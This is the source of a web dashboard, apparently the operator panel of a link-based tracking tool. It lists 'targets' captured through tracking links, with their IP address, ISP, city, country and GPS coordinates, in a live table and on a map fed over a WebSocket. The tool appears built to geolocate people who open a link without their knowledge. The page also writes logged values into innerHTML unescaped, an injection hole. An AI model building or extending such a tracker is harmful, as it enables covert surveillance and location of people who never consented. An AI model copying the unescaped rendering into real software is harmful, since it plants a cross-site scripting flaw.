<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>:: LIVE TRACKING LOGS v4.0 (Secure) ::</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style> 
        #map { height: 400px; width: 100%; margin-top: 20px; border: 1px solid #0f0; } 
        .log-table-container { max-height: 500px; overflow-y: auto; margin-top: 20px; }
    </style>
</head>
<body>
    <script>
        const token = localStorage.getItem('authToken');
        if (!token) {
            window.location.href = '/login.html';
        }
    </script>
    <div class="container full-width">
        <h1 class="main-title">> TRACKING_LOGS.DAT (LIVE MAP)</h1>
        <div class="nav-links">
            <a href="/dashboard.html">[ << BACK TO DASHBOARD ]</a>
        </div>
        
        <div id="map"></div>
        <div class="log-table-container">
            <table class="hacker-table">
                <thead>
                    <tr>
                        <th>Timestamp</th>
                        <th>Target ID</th>
                        <th>Link ID</th>
                        <th>IP Address</th>
                        <th>ISP</th>
                        <th>City</th>
                        <th>Country</th>
                        <th>Coords</th>
                    </tr>
                </thead>
                <tbody id="log-body">
                    </tbody>
            </table>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const authToken = localStorage.getItem('authToken');
        const authHeaders = {
            'Authorization': `Bearer ${authToken}`
        };

        const logBody = document.getElementById('log-body');
        let map;
        let markersLayer = L.layerGroup();

        function addMarkerToMap(loc) {
            if (!loc || typeof loc.latitude === 'undefined' || typeof loc.longitude === 'undefined') return;
            const locationString = (loc.city && loc.country) ? `${loc.city}, ${loc.country}` : 'Location unknown';
            const marker = L.marker([loc.latitude, loc.longitude]);
            marker.bindPopup(`<b>${loc.username}</b><br>${new Date(loc.created_at).toLocaleString('id-ID')}<br>${locationString}<br>IP: ${loc.ip_address}<br>ISP: ${loc.isp || 'N/A'}`);
            markersLayer.addLayer(marker);
        }
        function addRowToTable(loc) {
            const mapUrl = `https://maps.google.com/?q=${loc.latitude},${loc.longitude}`;
            const newRow = document.createElement('tr');
            newRow.innerHTML = `
                <td>${new Date(loc.created_at).toLocaleString('id-ID')}</td>
                <td class="highlight">${loc.username}</td>
                <td>${loc.tracker_id}</td>
                <td>${loc.ip_address}</td>
                <td>${loc.isp || 'N/A'}</td>
                <td class="highlight">${loc.city || 'N/A'}</td>
                <td class="highlight">${loc.country || 'N/A'}</td>
                <td><a href="${mapUrl}" target="_blank">View Map</a></td>
            `;
            logBody.prepend(newRow);
        }

        async function fetchInitialLogs() {
            try {
                const res = await fetch('/api/locations', { headers: authHeaders });
                 if (res.status === 401) {
                    localStorage.removeItem('authToken');
                    window.location.href = '/login.html';
                    return;
                }
                const rows = await res.json();
                if (!rows || !rows.length) return;

                rows.forEach(row => {
                    addMarkerToMap(row);
                    addRowToTable(row);
                });

                if (markersLayer.getLayers().length > 0) {
                    map.fitBounds(markersLayer.getBounds());
                }
            } catch (error) {
                console.error("Gagal memuat log awal:", error);
            }
        }

        function initMap() {
            if (!map) {
                map = L.map('map').setView([-2.5489, 118.0149], 5);
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                    attribution: '© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
                }).addTo(map);
                markersLayer.addTo(map);
            }
        }

        const socket = io();
        socket.on('connect', () => console.log('✅ Terhubung ke log stream via WebSocket!'));
        socket.on('new_location_logged', (newLocation) => {
            console.log('📍 Lokasi baru diterima secara real-time:', newLocation);
            addMarkerToMap(newLocation);
            addRowToTable(newLocation);
            map.panTo([newLocation.latitude, newLocation.longitude]);
        });
        
        document.addEventListener('DOMContentLoaded', () => {
            initMap();
            fetchInitialLogs();
        });
    </script>
</body>
</html>